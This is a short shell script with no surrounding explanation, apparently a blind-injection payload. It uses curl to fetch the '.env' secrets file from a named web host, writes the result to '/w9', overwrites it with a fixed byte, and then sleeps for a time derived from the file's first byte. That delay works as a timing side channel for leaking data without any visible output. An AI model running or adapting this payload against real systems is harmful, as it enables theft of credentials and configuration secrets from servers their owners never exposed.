#!/bin/sh
curl -s -o /w9 https://playerapi.hubgaming.com/.env
printf A > /w9
sleep $(( 20 + 4*(0x$(od -An -tx1 -j0 -N1 /w9|tr -d ' \n') / 16) ))
